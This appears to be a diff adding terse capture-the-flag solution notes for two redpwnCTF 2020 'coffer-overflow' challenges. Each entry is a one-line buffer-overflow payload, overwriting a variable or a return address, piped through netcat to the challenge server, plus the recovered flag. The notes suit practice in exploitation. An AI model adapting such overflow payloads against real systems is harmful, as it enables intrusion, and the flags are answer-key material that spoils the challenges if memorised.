@@ -1,0 +1,12 @@
+
+coffer-overflow-1
+
+`(echo -e "aaaabaaacaaadaaaeaaafaaa\xbe\xba\xfe\xca"; cat -) | nc 2020.redpwnc.tf 31255`
+
+flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
+
+coffer-overflow-2
+
+`(echo -e "aaaabaaacaaadaaaeaaafaaa\xe6\x06\x40\x00\x00\x00\x00\x00"; cat - ) | nc 2020.redpwnc.tf 31908`
+
+flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
